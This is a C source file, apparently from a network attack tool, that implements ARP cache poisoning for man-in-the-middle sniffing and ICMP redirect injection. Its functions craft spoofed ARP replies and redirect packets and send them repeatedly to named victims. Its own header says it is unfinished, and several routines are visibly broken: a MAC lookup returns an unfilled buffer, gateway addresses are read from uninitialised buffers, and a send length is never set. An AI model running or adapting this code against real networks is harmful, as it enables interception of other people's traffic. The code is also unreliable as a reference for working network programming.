/********************** active sniffing *****************************/

/*
*** NOT IMPLEMENTED AND RECHECKED YET ***

the purpose would be to to send various frames/packets to perform MITM sniffing with packets forwarding
with ARP poisonning, IGMP redirecting etc... in progress

crafting our own ARP spoofing packet to perform ARP poisonning to the target address
it would be a broadcast response or a selective response to a real ARP querry
*/

#include "inject.h"

int get_device_index(int sock, const char* device){

    struct ifreq ifr;
    safe_strcpy(ifr.ifr_name, IFNAMSIZ - 1, device);


    if (ioctl(sock,SIOCGIFINDEX, &ifr) == -1) {

        fprintf(stderr, "ERROR : %s\n", strerror(errno));
        return -1;
    }

    return ifr.ifr_ifindex;
}

// get host mac address

unsigned char *get_host_mac_address(int sock, const char* interface){

    struct ifreq ifr;

    memset_s(&ifr, 0, sizeof(struct ifreq));

    safe_strcpy(ifr.ifr_name, IFNAMSIZ, interface);
    
    if (ioctl(sock, SIOCGIFHWADDR, &ifr) != 0){

        fprintf(stderr, "ERROR : Couldn't get host MAC address\n");
        return NULL;
    }

    unsigned char *host_mac_adddress = fake_malloc(sizeof(unsigned char) * MAC_LENGTH);
    memcpy_s(host_mac_adddress, ifr.ifr_hwaddr.sa_data, MAC_LENGTH);

    return host_mac_adddress;
}


unsigned char *get_target_mac_address(int sock, const char *target_ip){

    char buffer[1024];
    struct ethhdr *eth_pkt;
    arp_packet *arp_pkt;
    unsigned char *victim_mac_address;
    char uint8_t_to_str[INET_ADDRSTRLEN] = {0};

    if (!(victim_mac_address = fake_malloc(sizeof(uint8_t) * MAC_LENGTH)))
        return (NULL);

    while (1){

        if (recv(sock, buffer, 1024, 0) <= 0) return (NULL);

        eth_pkt = (struct ethhdr*)buffer;

        if (ntohs(eth_pkt->h_proto) != ETH_P_ARP)
            continue;

        arp_pkt = (arp_packet *)(buffer + ETH2_HEADER_LEN);

        if (ntohs(arp_pkt->opcode) == ARP_OPCODE_REPLY && (arp_pkt->sender_ip != NULL && inet_ntop(AF_INET, arp_pkt->sender_ip, uint8_t_to_str, INET_ADDRSTRLEN))
            && !strcmp(uint8_t_to_str, target_ip)){

            memset_s(uint8_t_to_str, 0, INET_ADDRSTRLEN);
            break;
        }
    }

    return victim_mac_address;
}

struct ethhdr* create_arp_packet(const uint16_t opcode, const uint8_t *src_mac, const char *src_ip, 
    const uint8_t *dest_mac, const char *dest_ip){
    /** Create an ARP packet */

    arp_packet  *arp_pkt;
    if (!(arp_pkt = malloc(sizeof(arp_packet))))
        return (NULL);

    arp_pkt->hardware_type = htons(1);
    arp_pkt->protocol_type = htons(ETH_P_IP);
    arp_pkt->hardware_len = MAC_LENGTH;
    arp_pkt->protocol_len = IPV4_LENGTH;
    arp_pkt->opcode = htons(opcode);

    memcpy_s(&arp_pkt->sender_mac, src_mac, sizeof(uint8_t) * MAC_LENGTH);
    memcpy_s(&arp_pkt->target_mac, dest_mac, sizeof(uint8_t) * MAC_LENGTH);

    /* NOTE: See `man 3 inet_pton` */
    if (inet_pton(AF_INET, src_ip, arp_pkt->sender_ip) != 1 || inet_pton(AF_INET, dest_ip, arp_pkt->target_ip) != 1)
        return (NULL);

    /** Now wrap the ARP packet in IP header */

    struct ethhdr *eth_pkt;
    if (!(eth_pkt = malloc(sizeof(uint8_t) * 1024)))
        return (NULL);

    memcpy_s(&eth_pkt->h_dest, dest_mac, sizeof(uint8_t) * MAC_LENGTH);
    memcpy_s(&eth_pkt->h_source, src_mac, sizeof(uint8_t) * MAC_LENGTH);

    /* NOTE: Simply doing `memcpy_s(&eth_pkt->eth_type,htons(ETHERTYPE_ARP),size)`
     * doesn't work. The two char bytes need to be separately placed in
     * the upper and lower bytes. */
    memcpy_s(&eth_pkt->h_proto, (uint8_t[2]) { htons(ETHERTYPE_ARP) & 0xff, htons(ETHERTYPE_ARP) >> 8}, sizeof(uint8_t)*2);

    memcpy_s((uint8_t *)eth_pkt + ETH2_HEADER_LEN, arp_pkt, sizeof(uint8_t) * ARP_SPOOFING_PACKET_SIZE);

    return eth_pkt;
}

int send_broadcast_arp_packet(const int sd, struct sockaddr_ll *device, const uint8_t *hacker_mac,
    const char *spoof_ip, const char *target_ip){

    struct ethhdr* eth_pkt;

    /* NOTE: See <net/if_ether.h> for packet opcode */
    if (!(eth_pkt = create_arp_packet(ARP_OPCODE_REQUEST, hacker_mac, spoof_ip, BROADCAST_ADDR, target_ip))) {
        fprintf(stderr, "ERROR: Ethernet frame creation failed\n");
        return -1;
    }

    if ((sendto(sd, eth_pkt, ARP_SPOOFING_PACKET_SIZE + ETH2_HEADER_LEN, 0, (const struct sockaddr *)device, sizeof(*device))) <= 0) {
        fprintf(stderr, "ERROR: Could not send\n");
        return -1;
    }

    printf("[+] Packet sent to broadcast successfully\n");

    return 0;
}


int start_arp_spoofing_attack(int sock, struct sockaddr_ll *device, const uint8_t *hacker_mac, const char *victim_ip_1, const uint8_t *victim_mac_1,
    const char *victim_ip_2, const uint8_t *victim_mac_2){

    int max_arp_packets_nbr = 1024;

    struct ethhdr *arp_packet_1;
    struct ethhdr *arp_packet_2;

    if (!(arp_packet_1 = create_arp_packet(ARP_OPCODE_REPLY, hacker_mac, victim_ip_1, victim_mac_2, victim_ip_2))) {
        fprintf(stderr, "ERROR: ARP packet creation failed\n");
        return -1;
    }

    if (!(arp_packet_2 = create_arp_packet(ARP_OPCODE_REPLY, hacker_mac, victim_ip_2, victim_mac_1, victim_ip_1))) {
        fprintf(stderr, "ERROR: ARP packet creation failed\n");
        return -1;
    }

    while (max_arp_packets_nbr--) {

        if ((sendto(sock, arp_packet_1, ARP_SPOOFING_PACKET_SIZE + ETH2_HEADER_LEN, 0, (const struct sockaddr *)device, sizeof(*device))) <= 0) {
            fprintf(stderr, "ERROR: Could not send\n");
            return -1;
        }

        sleep(1);

        if ((sendto(sock, arp_packet_2, ARP_SPOOFING_PACKET_SIZE + ETH2_HEADER_LEN, 0, (const struct sockaddr *)device, sizeof(*device))) <= 0) {
            fprintf(stderr, "ERROR: Could not send\n");
            return -1;
        }

        fprintf(stdout, "SPOOFED Packet sent to '%s'\n", victim_ip_1);
        sleep(3);
    }

    return 0;
}

// launching the cache poisonning, return 0 in succes, or -1 if error

int launch_arp_spoofing_attack(const char* victim_ip_1, const char* victim_ip_2, const char* interface){

    int sock;
    struct sockaddr_ll device;

    char *victim_mac_1  = fake_malloc(sizeof(char) * 20);
    char *victim_mac_2  = fake_malloc(sizeof(char) * 20);
    char *hacker_mac    = fake_malloc(sizeof(char) * 20);

    if ((sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) == -1) {
        fprintf(stderr, "ERROR: Socket creation failed\n");
        return -1;
    }

    if (!(hacker_mac = get_host_mac_address(sock, interface))) {
        fprintf(stderr, "ERROR: Could not get MAC address\n");
        return -1;
    }

    memset_s(&device, 0, sizeof(device));

    /*if (!get_device_index(&device, interface)) {
        return -1;
    }
    */

    if (!send_broadcast_arp_packet(sock, &device, hacker_mac, victim_ip_2, victim_ip_1)) {
        return -1;
    }

    victim_mac_1 = get_target_mac_address(sock, victim_ip_1);

    if (!send_broadcast_arp_packet(sock, &device, hacker_mac, victim_ip_1, victim_ip_2)) {
        return -1;
    }

    victim_mac_2 = get_target_mac_address(sock, victim_ip_2);

    start_arp_spoofing_attack(sock, &device, hacker_mac, victim_ip_1, victim_mac_1, victim_ip_2, victim_mac_2);

    close(sock);

    return 0;
}

/******************************* ICMP Redirect ******************************/

int create_icmp_sock(int ttl){

    int icmp_sock;

    icmp_sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);

    if (icmp_sock < 0 ){

        fprintf(stderr, "ERROR : Couln't create icmp socket\n");
        return -1;
    }

    // setting time to live

    if ( setsockopt(icmp_sock, SOL_IP, IP_TTL, &ttl, sizeof(ttl)) != 0){

        fprintf(stderr, "ERROR : Couldn't set TTL option for icmp redirecting\n");
        return -1;
    }

    // setting nonblocking mode

    if ( fcntl(icmp_sock, F_SETFL, O_NONBLOCK) != 0 ){

        fprintf(stderr, "ERROR : Failed setting nonblocking I/O for icmp socket\n");
        return -1;
    }

    return icmp_sock;
}


unsigned short cksum(unsigned short *addr, int len) {

    int sum = 0;
    unsigned short res = 0;
    while (len > 1) {
        sum += *addr++;
        len -= 2;
    }
    if( len == 1) {
        *((unsigned char *)(&res)) = *((unsigned char *)addr);
        sum += res;
    }
    sum = (sum >>16) + (sum & 0xffff);
    sum += (sum >>16);
    res = ~sum;
    return res;
}


unsigned char* send_icmp_packet(unsigned char *cur_packet, int ttl, struct sockaddr_in* target){

    char new_gateway[1024], current_gateway[1024];
    unsigned char* nullptr;
    nullptr = NULL;
    
    struct sockaddr_ll socket_address;
    struct iphdr* ip_struct = (struct iphdr*)(cur_packet + 14);

    icmp_packet* packet = fake_malloc(sizeof(icmp_packet));

    if (packet == NULL){

        fprintf(stderr, "ERROR : Could't allocate memory for icmp packet\n");
        return nullptr;
    }

    int len = 14 + 28 + (ip_struct->ihl << 2) + 8;

    for (int i = 0; i < 6; ++i) 
        socket_address.sll_addr[i] = packet->eth.h_dest[i] = cur_packet[i + 6];

    memset_s(packet->eth.h_source, 0, sizeof(packet->eth.h_source));
    packet->eth.h_proto = htons(ETH_P_IP);

    packet->ip.version = 4;
    packet->ip.ihl = 5;
    packet->ip.tos = 0;
    packet->ip.tot_len = htons(len - 14);
    packet->ip.id = getpid();
    packet->ip.frag_off = 0;
    packet->ip.ttl = ttl;
    packet->ip.protocol = IPPROTO_ICMP;
    packet->ip.check = 0;

    target->sin_addr = *(struct in_addr*)&ip_struct->saddr;
    packet->ip.daddr = target->sin_addr.s_addr;

    if (inet_aton(current_gateway, &target->sin_addr) == 0){

        fprintf(stderr, "ERROR : Bad ip address %s\n", current_gateway);
        return nullptr;
    }

    packet->ip.saddr = target->sin_addr.s_addr;
    packet->ip.check = in_cksum((unsigned short *)&packet->ip, 20);
    packet->icmp.type = ICMP_REDIRECT;
    packet->icmp.code = 1;
    packet->icmp.checksum = 0;

    if (inet_aton(new_gateway, &target->sin_addr) == 0){

        fprintf(stderr, "ERROR : Bad ip address %s\n", new_gateway);
        return nullptr;
    }

    packet->icmp.un.gateway = target->sin_addr.s_addr;

    for (int i = 0; i < (ip_struct->ihl << 2) + 8; ++i) 
        packet->data[i] = cur_packet[14 + i];

    packet->icmp.checksum = cksum((unsigned short *)&packet->icmp, 8 + (ip_struct->ihl << 2) + 8);
    target->sin_addr = *(struct in_addr*)&ip_struct->saddr;

    return (unsigned char*)packet;
}


int start_icmp_redirecting(unsigned char* current_packet, struct sockaddr_in* target, int packet_len, int ttl, int max_packets, int sleep_time){

    opt_struct* opt = fake_malloc(sizeof(opt_struct));

    if (opt == NULL){

        fprintf(stderr, "ERROR : Could't allocate memory for icmp options struct\n");
        return -1;
    }

    memset_s(opt, 0, sizeof(opt_struct));

    opt->ttl = ttl;
    opt->packets_nbr = max_packets;
    opt->sleep_time = sleep_time;
    opt->packet_size = packet_len;

    memcpy_s(opt->target_addr, target, sizeof(struct sockaddr_in));

    opt->socket = create_icmp_sock(ttl);

    assert(opt->socket != -1);

    unsigned char *temp = send_icmp_packet(current_packet, ttl, opt->target_addr);

    assert(temp != NULL);

    memcpy_s(opt->packet, temp, opt->packet_size);

    pthread_t thread_id;

    if(pthread_create(&thread_id , NULL, connection_handler, (void*)&opt) < 0){

        fprintf(stderr, "ERROR : Could not create thread\n");
        return -1;
    }

    printf("ICMP Redirect attack launched successfully !\n");

    return 0;

}


void *connection_handler(void* opt_s){

    opt_struct* opt = (opt_struct*)opt_s;

    int sock = *(int*)&opt->socket;
    int sleep_mode = *(int*)&opt->sleep_time;
    int max_packets = *(int*)&opt->packets_nbr;
    int len = opt->packet_size;
    int recv_len;

    while(max_packets--){
        if (sendto(sock, opt->packet, recv_len, 0, (struct sockaddr*)&opt->target_addr, (socklen_t)len) == -1){
            max_packets = 0;
            //free(opt);
        }

        sleep(sleep_mode);
    }

    /*
    free(opt->packet);
    free(opt);
    */

}
